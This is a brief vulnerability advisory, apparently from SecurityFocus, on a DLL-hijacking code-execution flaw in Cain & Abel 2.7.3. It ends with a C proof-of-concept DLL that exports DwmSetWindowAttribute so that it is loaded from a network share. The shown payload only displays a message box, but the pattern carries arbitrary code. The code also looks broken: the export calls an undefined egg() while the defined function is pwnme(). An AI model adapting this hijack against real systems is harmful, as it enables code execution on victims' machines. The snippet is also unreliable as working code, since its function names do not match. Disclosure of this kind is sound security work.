source: http://www.securityfocus.com/bid/46239/info

Cain & Abel is prone to an arbitrary-code-execution vulnerability.

An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file.

Cain & Abel 2.7.3 is vulnerable; other versions may also be affected. 

#include <windows.h>
#define DllExport __declspec (dllexport)
DllExport void DwmSetWindowAttribute() { egg(); }

int pwnme()
{
  MessageBox(0, "dll hijacked !! ", "Dll Message", MB_OK);
  exit(0);
  return 0;
}